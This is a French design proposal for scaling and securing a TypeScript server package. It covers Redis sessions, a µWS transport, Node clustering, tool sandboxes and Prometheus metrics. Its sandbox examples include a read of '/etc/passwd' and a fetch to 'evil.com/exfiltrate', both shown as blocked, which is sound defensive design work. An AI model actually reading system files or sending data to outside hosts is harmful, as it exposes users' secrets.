# Feature #06 — Scalabilité & Sécurité Serveur (TypeScript-native)

> **Basé sur** : `cahiers/RUST_MIGRATION_PROPOSAL.md`
> **Conclusion principale** : Tout ce que le document propose en Rust a un équivalent TypeScript mature. La migration Rust est inutile à ce stade.

---

## Analyse de l'existant

### Ce qui EXISTE déjà dans `@domos/server`

| Composant | Fichier | État |
|-----------|---------|------|
| Rate limiting en mémoire | `middleware/rateLimit.ts` — `RateLimitMiddleware` | ✅ Fonctionnel |
| Rate limiting Redis distribué | `middleware/rateLimit.ts` — `RedisRateLimiter` | ✅ Fonctionnel |
| Connection pool | `transport/ConnectionPool.ts` | ✅ Fonctionnel |
| Sessions en mémoire | `persistence/MemoryStore.ts` | ✅ Fonctionnel |
| Sessions MongoDB | `persistence/MongoStore.ts` | ✅ Fonctionnel |
| Sessions SQLite | `persistence/SQLiteStore.ts` | ✅ Fonctionnel |
| Interface `SessionStore` abstraite | `persistence/types.ts` | ✅ Fonctionnel |
| `SessionManager.setStore()` | `core/SessionManager.ts` | ✅ Fonctionnel |
| Transport WebSocket (`ws`) | `transport/adtp.transport.ts` | ✅ Fonctionnel |

### Ce qui MANQUE (les gaps réels)

| Gap | Impact | Équivalent Rust dans le doc |
|-----|--------|----------------------------|
| `RedisSessionStore` | Sessions perdues en cas de redémarrage, impossible de scaler horizontalement | `SessionManager` Redis (Phase 1) |
| `DomOSServer.setSessionStore()` méthode publique | Le `SessionManager` a déjà `setStore()` mais n'est pas exposé via `DomOSServer` | idem |
| Node.js `cluster` entry point | 1 seul core CPU utilisé en production | Cluster Node (Phase 1) |
| Transport µWS (`uWebSockets.js`) | `ws` plafonne à ~10k connexions. µWS = 100k+. **L'équivalent TS du transport Rust** | `tokio-tungstenite` (Phase 2) |
| `FilesystemSandbox` | Un tool malveillant peut lire `/etc/passwd` | Rust `fs_sandbox.rs` (Phase 3) |
| `NetworkSandbox` | Un tool peut exfiltrer des données vers n'importe quel serveur | Rust `network_sandbox.rs` (Phase 3) |
| Métriques Prometheus | Pas d'observabilité en production | Prometheus (Phase 1) |

---

## Équivalences Rust → TypeScript

### `tokio-tungstenite` → `uWebSockets.js` (µWS)

Le document Rust cite `tokio-tungstenite` pour aller de ~10k à ~100k connexions WebSocket.
**L'équivalent TypeScript exact existe** : `uWebSockets.js` (µWS), utilisé par Bun comme moteur interne.

| Métrique | `ws` npm (actuel) | `uWebSockets.js` | Rust `tokio-tungstenite` |
|----------|-------------------|------------------|--------------------------|
| Connexions max | ~10k | ~100k | ~100k |
| Mémoire (10k connexions) | ~2.5 GB | ~600 MB | ~500 MB |
| Latence P99 | ~50ms | ~8ms | ~5ms |
| Complexité migration | — | `UWS_TOPIC_*` API différente | Réécriture complète |

**Package npm** : `uWebSockets.js` (aucune dépendance native à compiler, binaire précompilé)

### `governor` (Rust rate limiting) → `RedisRateLimiter` (déjà présent)

Le `RedisRateLimiter` dans `middleware/rateLimit.ts` utilise exactement le même pattern `INCR + EXPIRE` que le Rust propose. **Il existe déjà, il suffit de l'utiliser.**

### `DashMap` (Rust concurrent HashMap) → `ConnectionPool` + Redis pub/sub

Pour le scaling horizontal (plusieurs workers), `ConnectionPool` en mémoire ne suffit pas. Redis pub/sub permet de router les messages entre workers. Mais pour un seul serveur multi-core, `ConnectionPool` actuel est suffisant avec `cluster`.

### Rust `fs_sandbox.rs` → `FilesystemSandbox` TypeScript pur

Pas besoin de Rust. Validation de chemins 100% TypeScript avec `path.resolve()` + allowlist.

```ts
// Concept — pure TypeScript, aucune dépendance
const sandbox = new FilesystemSandbox({ allowedPaths: ['/app/uploads'] });
sandbox.readFile('/etc/passwd');        // → throw SandboxViolation
sandbox.readFile('/app/uploads/img.jpg'); // → OK
```

### Rust `network_sandbox.rs` → `NetworkSandbox` TypeScript pur

Wrapper autour de `undici` (le client HTTP natif de Node.js 18+) qui valide l'URL avant chaque requête.

```ts
const sandbox = new NetworkSandbox({ allowedDomains: ['api.shopify.com'] });
await sandbox.fetch('https://api.shopify.com/products'); // → OK
await sandbox.fetch('https://evil.com/exfiltrate');      // → throw SandboxViolation
```

### Cluster Node.js → `cluster` module built-in

Aucun package externe. Le module `cluster` est dans Node.js depuis la v0.12. Besoin de sticky sessions WebSocket (le client doit toujours tomber sur le même worker) → via `@socket.io/sticky` ou `native-node-utils`.

### Prometheus → `prom-client`

Le package npm standard pour exposer des métriques Prometheus en Node.js. Expose un endpoint `GET /metrics` sur un port séparé (ne pas exposer sur le port WebSocket public).

---

## Proposition de contenu — 5 sous-features

### 6a — `RedisSessionStore` + exposition via `DomOSServer`

**Fichiers concernés :**
- `packages/server/src/persistence/RedisSessionStore.ts` — **Créer**
- `packages/server/src/core/DomOSServer.ts` — **Modifier** : ajouter option `sessionStore?: SessionStore`
- `packages/server/src/index.ts` — **Modifier** : exporter `RedisSessionStore`

**API publique proposée :**
```ts
// Usage
import { DomOSServer, RedisSessionStore } from '@domos/server';

const store = new RedisSessionStore({
  redisUrl: process.env.REDIS_URL!,
  sessionTTL: 24 * 60 * 60 * 1000, // 24h
});
await store.connect();

const server = new DomOSServer({
  llm,
  sessionStore: store, // nouveau paramètre
});
```

**Dépendance** : `ioredis` — déjà en peer dep dans `package.json`

---

### 6b — `UWSTransport` (transport µWS en remplacement de `ws`)

**Fichiers concernés :**
- `packages/server/src/transport/UWSTransport.ts` — **Créer** (implémente l'interface `Transport`)
- `packages/server/src/core/DomOSServer.ts` — **Modifier** : `transport: 'websocket' | 'webrtc' | 'uws'`
- `packages/server/src/index.ts` — **Modifier** : exporter `UWSTransport`

**API publique proposée :**
```ts
const server = new DomOSServer({
  llm,
  transport: 'uws', // activer µWS au lieu de 'ws'
  port: 3001,
});
```

Le `UWSTransport` implémente la même interface `Transport` que `ADTPTransport` — zéro changement de logique métier.

**Dépendance** : `uWebSockets.js` — binaire précompilé, `pnpm add uWebSockets.js`

**⚠️ Point bloquant** : `uWebSockets.js` a une API différente de `ws` (pas d'events, tout est callback). La migration est sûre car derrière l'interface `Transport`, mais demande attention.

---

### 6c — Cluster Node.js (`apps/demo-scale`)

**Pas de modification aux packages.** Création d'une nouvelle app dans `apps/` pour démontrer le pattern.

**Fichiers concernés :**
- `apps/demo-scale/src/cluster.ts` — **Créer** (entry point multi-workers)
- `apps/demo-scale/src/worker.ts` — **Créer** (logique serveur dans chaque worker)
- `apps/demo-scale/package.json` — **Créer**
- `apps/demo-scale/.env.example` — **Créer**

**Pattern proposé :**
```ts
// cluster.ts — primary process
import cluster from 'node:cluster';
import { availableParallelism } from 'node:os';

if (cluster.isPrimary) {
  const cpus = availableParallelism();
  for (let i = 0; i < cpus; i++) cluster.fork();
  cluster.on('exit', () => cluster.fork()); // auto-restart
} else {
  await import('./worker.js');
}
```

**Sticky sessions** : avec `RedisSessionStore` (6a), tout worker peut servir n'importe quelle session. Pas besoin de sticky routing.

---

### 6d — `FilesystemSandbox` + `NetworkSandbox`

**Fichiers concernés :**
- `packages/server/src/security/FilesystemSandbox.ts` — **Créer**
- `packages/server/src/security/NetworkSandbox.ts` — **Créer**
- `packages/server/src/index.ts` — **Modifier** : exporter les deux sandboxes

**Ces classes sont à usage des auteurs de tools côté serveur**, pas du core DomOS lui-même. Elles ne s'intègrent pas automatiquement — l'auteur du tool les utilise explicitement.

```ts
// Exemple dans un server tool
import { FilesystemSandbox, NetworkSandbox } from '@domos/server';

const fs = new FilesystemSandbox({ allowedPaths: ['/app/data'] });
const net = new NetworkSandbox({ allowedDomains: ['api.acme.com'] });

server.registerTool('read_report', async (args) => {
  const content = await fs.readFile(args.path);  // valide le path avant
  return content;
});
```

**Aucune dépendance externe.** 100% TypeScript avec `node:path` et `undici`.

---

### 6e — Métriques Prometheus

**Fichiers concernés :**
- `packages/server/src/metrics/PrometheusMetrics.ts` — **Créer**
- `packages/server/src/core/DomOSServer.ts` — **Modifier** : option `metrics?: { enabled: boolean; port?: number }`
- `packages/server/src/index.ts` — **Modifier** : exporter `PrometheusMetrics`

**Métriques exposées :**
- `domos_connections_total` — connexions actives
- `domos_sessions_total` — sessions actives
- `domos_llm_requests_total` — appels LLM (label: modèle)
- `domos_llm_latency_ms` — latence LLM (histogramme)
- `domos_tool_calls_total` — tools appelés (label: tool_name, risk)
- `domos_rate_limit_blocked_total` — requêtes bloquées

**Dépendance** : `prom-client` — le standard npm pour Prometheus

---

## Roadmap proposée

### Priorité HAUTE (gains immédiats sans breaking change)

| # | Feature | Effort | Impact |
|---|---------|--------|--------|
| 6a | `RedisSessionStore` + `DomOSServer.sessionStore` | 1 jour | Sessions persistantes, prêt au cluster |
| 6c | `apps/demo-scale` (Node.js cluster) | 0.5 jour | Multi-core sans toucher les packages |

### Priorité MOYENNE (performance WebSocket)

| # | Feature | Effort | Impact |
|---|---------|--------|--------|
| 6b | `UWSTransport` (µWS) | 2-3 jours | 10x connexions max |

### Priorité BASSE (sécurité outils tiers)

| # | Feature | Effort | Impact |
|---|---------|--------|--------|
| 6d | `FilesystemSandbox` + `NetworkSandbox` | 1 jour | Sandbox pour tools tiers |
| 6e | Prometheus metrics | 1 jour | Observabilité production |

---

## Ce que ce document ne propose PAS

- ❌ Migration Rust / NAPI — inutile, µWS suffit
- ❌ Migration Deno — pas de gain réel
- ❌ Modification de `@domos/shopify` ou `@domos/woocommerce` — gelés pendant Feature #05
- ❌ Nginx/Caddy config — hors scope code, documentation infra séparée

---

## Critères de validation

1. `pnpm build` passe dans `@domos/server`
2. `new RedisSessionStore(...).connect()` puis `server.start()` → sessions persistantes entre redémarrages
3. `apps/demo-scale` démarre avec `N` workers (N = nombre de CPUs)
4. `new UWSTransport(...)` + `DomOSServer({ transport: 'uws' })` → même comportement qu'avec `ws`
5. `sandbox.readFile('/etc/passwd')` → `SandboxViolationError` (pas un crash serveur)
6. GET `/metrics` → réponse au format Prometheus text
